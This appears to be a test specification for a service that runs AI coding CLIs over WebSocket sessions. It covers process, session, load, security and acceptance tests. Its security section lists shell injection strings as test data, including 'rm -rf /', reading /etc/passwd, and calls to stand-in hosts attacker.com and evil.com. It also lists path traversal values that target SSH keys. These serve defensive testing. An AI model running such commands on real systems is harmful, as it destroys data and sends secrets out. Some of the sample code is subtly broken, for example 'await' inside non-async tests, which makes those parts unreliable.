# CLI Integration Test Specification

## Test Strategy Overview

### Testing Objectives
- Verify functional correctness of CLI integration
- Ensure performance meets requirements
- Validate security controls
- Confirm reliability under stress
- Test user experience flows

### Test Levels
1. **Unit Tests**: Individual component testing
2. **Integration Tests**: Component interaction testing  
3. **System Tests**: End-to-end functionality
4. **Performance Tests**: Load and stress testing
5. **Security Tests**: Vulnerability testing
6. **Acceptance Tests**: User scenario validation

### Test Environment Requirements
- Docker containers for isolated testing
- Mock CLI binaries for deterministic tests
- Real CLI binaries for acceptance tests
- Redis test instance
- Test data fixtures

## Unit Test Specifications

### UT-1: Process Manager Tests

#### UT-1.1: Process Spawning
```python
class TestProcessSpawning:
    def test_spawn_valid_provider(self):
        """Test spawning process with valid provider"""
        # Arrange
        manager = CLIProcessManager()
        
        # Act
        process = await manager.spawn_process(
            provider="claude",
            session_id="test-session",
            working_dir="/tmp/test"
        )
        
        # Assert
        assert process.pid > 0
        assert process.is_alive()
        assert manager.get_process(process.pid) is not None
    
    def test_spawn_invalid_provider(self):
        """Test spawning process with invalid provider"""
        # Arrange
        manager = CLIProcessManager()
        
        # Act & Assert
        with pytest.raises(InvalidProviderError):
            await manager.spawn_process(
                provider="invalid",
                session_id="test-session"
            )
    
    def test_spawn_resource_limit(self):
        """Test resource limit enforcement"""
        # Arrange
        manager = CLIProcessManager(max_processes=2)
        
        # Act
        process1 = await manager.spawn_process("claude", "session1")
        process2 = await manager.spawn_process("codex", "session2")
        
        # Assert
        with pytest.raises(ResourceLimitError):
            await manager.spawn_process("gemini", "session3")
```

#### UT-1.2: Process Communication
```python
class TestProcessCommunication:
    def test_send_command(self):
        """Test sending command to process"""
        # Arrange
        manager = CLIProcessManager()
        process = await manager.spawn_process("claude", "test")
        
        # Act
        output = []
        async for chunk in manager.send_command(process.pid, "test command"):
            output.append(chunk)
        
        # Assert
        assert len(output) > 0
        assert "".join(output).strip() != ""
    
    def test_stream_output(self):
        """Test output streaming"""
        # Arrange
        manager = CLIProcessManager()
        process = await manager.spawn_process("claude", "test")
        
        # Act
        chunks = []
        async for chunk in manager.stream_output(process.pid):
            chunks.append(chunk)
            if len(chunks) >= 5:
                break
        
        # Assert
        assert len(chunks) == 5
        assert all(isinstance(chunk, str) for chunk in chunks)
```

#### UT-1.3: Process Lifecycle
```python
class TestProcessLifecycle:
    def test_terminate_process(self):
        """Test graceful process termination"""
        # Arrange
        manager = CLIProcessManager()
        process = await manager.spawn_process("claude", "test")
        
        # Act
        result = await manager.terminate_process(process.pid)
        
        # Assert
        assert result == True
        assert not process.is_alive()
        assert manager.get_process(process.pid) is None
    
    def test_process_timeout(self):
        """Test automatic process timeout"""
        # Arrange
        manager = CLIProcessManager(idle_timeout=1)
        process = await manager.spawn_process("claude", "test")
        
        # Act
        await asyncio.sleep(2)
        
        # Assert
        assert not process.is_alive()
        assert manager.get_process(process.pid) is None
```

### UT-2: Session Manager Tests

#### UT-2.1: Session Creation
```python
class TestSessionCreation:
    def test_create_session(self):
        """Test session creation"""
        # Arrange
        manager = CLISessionManager()
        
        # Act
        session = await manager.create_session(
            provider="claude",
            user_id="user-123"
        )
        
        # Assert
        assert session.id is not None
        assert session.provider == "claude"
        assert session.status == SessionStatus.INITIALIZING
        assert session.user_id == "user-123"
    
    def test_session_uniqueness(self):
        """Test session ID uniqueness"""
        # Arrange
        manager = CLISessionManager()
        
        # Act
        sessions = [
            await manager.create_session("claude", "user")
            for _ in range(100)
        ]
        
        # Assert
        session_ids = [s.id for s in sessions]
        assert len(session_ids) == len(set(session_ids))
```

#### UT-2.2: Session State Management
```python
class TestSessionState:
    def test_update_session_state(self):
        """Test session state updates"""
        # Arrange
        manager = CLISessionManager()
        session = await manager.create_session("claude", "user")
        
        # Act
        await manager.update_state(
            session.id,
            SessionStatus.READY
        )
        
        # Assert
        updated = await manager.get_session(session.id)
        assert updated.status == SessionStatus.READY
    
    def test_session_persistence(self):
        """Test session Redis persistence"""
        # Arrange
        manager = CLISessionManager()
        session = await manager.create_session("claude", "user")
        
        # Act
        # Simulate manager restart
        new_manager = CLISessionManager()
        restored = await new_manager.get_session(session.id)
        
        # Assert
        assert restored.id == session.id
        assert restored.provider == session.provider
```

### UT-3: WebSocket Handler Tests

#### UT-3.1: Message Processing
```python
class TestMessageProcessing:
    def test_parse_command_message(self):
        """Test parsing command message"""
        # Arrange
        handler = CLIWebSocketHandler()
        message = {
            "type": "command",
            "id": "cmd-123",
            "data": {"command": "test"}
        }
        
        # Act
        parsed = handler.parse_message(json.dumps(message))
        
        # Assert
        assert parsed.type == "command"
        assert parsed.data.prompt == "test"
    
    def test_invalid_message_format(self):
        """Test invalid message handling"""
        # Arrange
        handler = CLIWebSocketHandler()
        
        # Act & Assert
        with pytest.raises(InvalidMessageError):
            handler.parse_message("invalid json")
```

## Integration Test Specifications

### IT-1: End-to-End CLI Communication

#### IT-1.1: Complete Command Flow
```python
class TestCompleteFlow:
    async def test_claude_integration(self):
        """Test complete Claude CLI integration"""
        # Arrange
        client = TestClient(app)
        
        # Act
        # Create session
        response = client.post("/api/cli/sessions", json={
            "cli_tool": "claude"
        })
        session = response.json()
        
        # Connect WebSocket
        with client.websocket_connect(f"/ws/cli/{session['sessionId']}") as ws:
            # Send command
                ws.send_json({
                    "type": "command",
                    "data": {"command": "echo 'Hello'"}
                })
            
            # Receive output
            messages = []
            while True:
                msg = ws.receive_json()
                messages.append(msg)
                if msg["type"] == "completion":
                    break
        
        # Assert
        assert response.status_code == 201
        assert any(m["type"] == "output" for m in messages)
        assert any("Hello" in m.get("data", {}).get("content", "") 
                  for m in messages)
```

#### IT-1.2: Multi-Provider Switching
```python
class TestMultiProvider:
    async def test_provider_switching(self):
        """Test switching between providers"""
        # Arrange
        client = TestClient(app)
        providers = ["claude", "codex", "gemini"]
        
        # Act
        sessions = []
        for provider in providers:
            response = client.post("/api/cli/sessions", json={
                "cli_tool": provider
            })
            sessions.append(response.json())
        
        # Assert
        assert len(sessions) == 3
        assert all(s["provider"] == p 
                  for s, p in zip(sessions, providers))
        
        # Test each session works
        for session in sessions:
            with client.websocket_connect(f"/ws/cli/{session['sessionId']}") as ws:
                ws.send_json({
                    "type": "status"
                })
                status = ws.receive_json()
                assert status["type"] == "status"
```

### IT-2: Session Recovery

#### IT-2.1: Connection Recovery
```python
class TestConnectionRecovery:
    async def test_websocket_reconnection(self):
        """Test WebSocket reconnection"""
        # Arrange
        client = TestClient(app)
        session = client.post("/api/cli/sessions", json={
            "provider": "claude"
        }).json()
        
        # Act
        # First connection
        with client.websocket_connect(f"/ws/cli/{session['sessionId']}") as ws1:
            ws1.send_json({
                "type": "command",
                "data": {"prompt": "test1"}
            })
            ws1.receive_json()  # Wait for response
        
        # Reconnection
        with client.websocket_connect(f"/ws/cli/{session['sessionId']}") as ws2:
            ws2.send_json({
                "type": "status"
            })
            status = ws2.receive_json()
        
        # Assert
        assert status["data"]["status"] in ["ready", "idle"]
```

## Performance Test Specifications

### PT-1: Load Testing

#### PT-1.1: Concurrent Sessions
```python
class TestConcurrentLoad:
    async def test_10_concurrent_sessions(self):
        """Test 10 concurrent CLI sessions"""
        # Arrange
        async def create_and_use_session(index):
            client = AsyncClient(app)
            
            # Create session
            response = await client.post("/api/cli/sessions", json={
                "provider": "claude"
            })
            session = response.json()
            
            # Send commands
            async with client.websocket(f"/ws/cli/{session['sessionId']}") as ws:
                for i in range(5):
                    await ws.send_json({
                        "type": "command",
                        "data": {"prompt": f"test {index}-{i}"}
                    })
                    await ws.receive_json()
            
            return session["sessionId"]
        
        # Act
        start = time.time()
        sessions = await asyncio.gather(*[
            create_and_use_session(i) for i in range(10)
        ])
        duration = time.time() - start
        
        # Assert
        assert len(sessions) == 10
        assert len(set(sessions)) == 10  # All unique
        assert duration < 30  # Complete within 30 seconds
```

#### PT-1.2: Message Throughput
```python
class TestThroughput:
    async def test_message_rate(self):
        """Test message processing rate"""
        # Arrange
        client = AsyncClient(app)
        session = await client.post("/api/cli/sessions", json={
            "cli_tool": "claude"
        })
        
        # Act
        message_count = 0
        start = time.time()
        
        async with client.websocket(f"/ws/cli/{session['sessionId']}") as ws:
            # Send 100 messages
            for i in range(100):
                await ws.send_json({
                    "type": "command",
                    "data": {"command": f"echo {i}"}
                })
            
            # Receive responses
            while message_count < 100:
                msg = await ws.receive_json()
                if msg["type"] == "completion":
                    message_count += 1
        
        duration = time.time() - start
        rate = message_count / duration
        
        # Assert
        assert rate >= 10  # At least 10 messages per second
```

### PT-2: Stress Testing

#### PT-2.1: Resource Limits
```python
class TestResourceLimits:
    async def test_memory_limit(self):
        """Test memory limit enforcement"""
        # Arrange
        monitor = ResourceMonitor()
        
        # Act
        # Create sessions until memory limit
        sessions = []
        while monitor.memory_usage() < 0.8:
            response = await client.post("/api/cli/sessions", json={
                "provider": "claude"
            })
            sessions.append(response.json())
        
        # Try to create one more
        response = await client.post("/api/cli/sessions", json={
            "provider": "claude"
        })
        
        # Assert
        assert response.status_code == 503
        assert "resource_exhausted" in response.json()["error"]
```

## Security Test Specifications

### ST-1: Input Validation

#### ST-1.1: Command Injection
```python
class TestCommandInjection:
    def test_shell_injection_prevention(self):
        """Test prevention of shell injection"""
        # Arrange
        injections = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc attacker.com 1234",
            "test`whoami`",
            "test$(curl evil.com)",
        ]
        
        # Act & Assert
        for injection in injections:
            response = client.post("/api/cli/sessions/123/command", json={
                "prompt": injection
            })
            
            # Should either sanitize or reject
            assert response.status_code in [200, 400]
            if response.status_code == 200:
                # Verify command was sanitized
                assert ";" not in response.json()["executed_command"]
                assert "&&" not in response.json()["executed_command"]
```

#### ST-1.2: Path Traversal
```python
class TestPathTraversal:
    def test_working_directory_escape(self):
        """Test prevention of directory traversal"""
        # Arrange
        traversals = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/passwd",
            "~/.ssh/id_rsa"
        ]
        
        # Act & Assert
        for path in traversals:
            response = client.post("/api/cli/sessions", json={
                "cli_tool": "claude",
                "cwd": path
            })
            
            assert response.status_code == 400
            assert "invalid_path" in response.json()["error"]
```

### ST-2: Authentication & Authorization

#### ST-2.1: Token Validation
```python
class TestAuthentication:
    def test_invalid_token(self):
        """Test invalid token rejection"""
        # Arrange
        invalid_tokens = [
            "invalid",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid",
            "",
            None
        ]
        
        # Act & Assert
        for token in invalid_tokens:
            headers = {"Authorization": f"Bearer {token}"} if token else {}
            response = client.post("/api/cli/sessions", 
                                  headers=headers,
                                  json={"provider": "claude"})
            
            assert response.status_code == 401
```

#### ST-2.2: Permission Checks
```python
class TestAuthorization:
    def test_full_access_permission(self):
        """Test full access mode authorization"""
        # Arrange
        # User without full_access permission
        limited_token = create_token(permissions=["cli:use"])
        
        # Act
        response = client.post("/api/cli/sessions",
                              headers={"Authorization": f"Bearer {limited_token}"},
                              json={
                                  "cli_tool": "claude",
                                  "full_access": true
                              })
        
        # Assert
        assert response.status_code == 403
        assert "permission_denied" in response.json()["error"]
```

## User Acceptance Test Specifications

### UAT-1: Developer Workflow

#### UAT-1.1: Code Analysis Workflow
```gherkin
Feature: Code Analysis via CLI
  As a developer
  I want to analyze code using CLI tools
  So that I can identify issues and improvements

  Scenario: Analyze Python module for security issues
    Given I am logged in as a developer
    And I have selected the "claude" provider
    When I create a new CLI session
    And I send the command "Analyze auth.py for security vulnerabilities"
    Then I should see output streaming in real-time
    And the output should contain security analysis
    And the session should remain active for follow-up questions
    
  Scenario: Switch between providers
    Given I have an active "claude" session
    When I create a new "codex" session
    And I switch to the "codex" session
    And I send a command to the "codex" session
    Then both sessions should remain independent
    And I should be able to switch back to "claude"
```

#### UAT-1.2: Debugging Workflow
```gherkin
Feature: Interactive Debugging
  As a developer
  I want to debug code interactively
  So that I can quickly identify and fix issues

  Scenario: Debug failing test
    Given I have a failing test case
    When I create a CLI session with the test file context
    And I send "Debug why test_authentication is failing"
    Then I should receive step-by-step debugging output
    And I should be able to send follow-up questions
    And the session should maintain context
```

### UAT-2: Performance Requirements

#### UAT-2.1: Response Time
```gherkin
Feature: Acceptable Response Times
  As a user
  I expect fast response times
  So that my workflow is not interrupted

  Scenario: Initial response time
    When I send a command to the CLI
    Then I should see the first output within 2 seconds
    
  Scenario: Streaming performance
    When the CLI is generating a long response
    Then output should stream smoothly without freezing
    And each chunk should appear within 100ms
```

## Test Data Requirements

### Test Fixtures
```yaml
fixtures:
  providers:
    - name: "mock_claude"
      binary: "/usr/bin/mock-claude"
      responses:
        - prompt: "echo.*"
          output: "Echo response"
        - prompt: "analyze.*"
          output: "Analysis complete"
    
    - name: "mock_codex"
      binary: "/usr/bin/mock-codex"
      responses:
        - prompt: ".*"
          output: "Codex response"
  
  sessions:
    - id: "test-session-1"
      provider: "claude"
      status: "ready"
      history:
        - type: "command"
          content: "Previous command"
        - type: "output"
          content: "Previous output"
  
  users:
    - id: "test-user-1"
      permissions: ["cli:use", "cli:full_access"]
      token: "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."
    
    - id: "test-user-2"
      permissions: ["cli:use"]
      token: "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9..."
```

## Test Automation

### CI/CD Pipeline
```yaml
test_pipeline:
  stages:
    - name: "Unit Tests"
      command: "pytest tests/unit -v --cov=orchestrator.cli"
      timeout: 300
      required: true
    
    - name: "Integration Tests"
      command: "pytest tests/integration -v"
      timeout: 600
      required: true
      services:
        - redis
        - mock-cli-binaries
    
    - name: "Performance Tests"
      command: "pytest tests/performance -v"
      timeout: 1200
      required: false
      environment: "staging"
    
    - name: "Security Tests"
      command: "pytest tests/security -v"
      timeout: 600
      required: true
    
    - name: "UAT"
      command: "behave tests/acceptance"
      timeout: 1800
      required: true
      environment: "staging"

  coverage:
    target: 80
    enforcement: true
    
  reporting:
    formats: ["junit", "html", "cobertura"]
    artifacts_path: "test-reports/"
```

## Test Metrics

### Coverage Requirements
- Unit Test Coverage: ≥ 80%
- Integration Test Coverage: ≥ 70%
- Critical Path Coverage: 100%

### Performance Benchmarks
- Process spawn time: < 2 seconds
- Command latency: < 500ms
- Stream chunk delivery: < 100ms
- 10 concurrent sessions: stable
- Memory per session: < 50MB

### Success Criteria
- All unit tests passing
- All integration tests passing
- Performance benchmarks met
- No critical security vulnerabilities
- UAT scenarios validated
